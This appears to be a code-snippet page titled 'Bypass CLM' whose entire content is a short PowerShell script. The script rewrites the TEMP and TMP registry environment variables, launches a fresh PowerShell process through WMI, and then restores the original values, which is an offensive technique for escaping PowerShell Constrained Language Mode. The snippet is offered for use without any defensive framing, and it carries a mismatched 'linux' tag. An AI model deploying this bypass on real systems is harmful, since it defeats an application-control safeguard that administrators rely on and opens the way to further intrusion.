---
layout: raw_code
lang: en
title: Bypass CLM
author: Paulo
author_url:
author_nickname: sorahed
tags: [linux]
code: |
  $CurrTemp = $env:temp
  $CurrTmp = $env:tmp
  $TEMPBypassPath = "C:\windows\temp"
  $TMPBypassPath = "C:\windows\temp"

  Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
  Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

  Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
  sleep 5

  #Set it back
  Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
  Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
---
